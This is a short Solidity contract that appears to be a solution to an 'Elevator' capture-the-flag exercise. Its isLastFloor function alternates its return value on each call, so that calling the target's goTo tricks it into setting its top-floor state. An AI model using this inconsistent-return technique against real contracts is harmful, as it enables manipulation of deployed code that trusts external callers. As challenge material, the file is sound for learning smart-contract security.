// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract BuildingExample {
  Elevator elevator;
  uint lastFloor = 100;
  uint nonce = 1; 

  constructor(Elevator _elevator) public {
    elevator = _elevator;
  }

  function isLastFloor(uint _lastFloor) external returns (bool) {
    if (nonce % 2 == 0) {
      nonce++;
      return true;
    } else {
      nonce++;
      return false;
    }
  }

  function callGoTo(uint _floor) external {
    elevator.goTo(_floor);
  }
}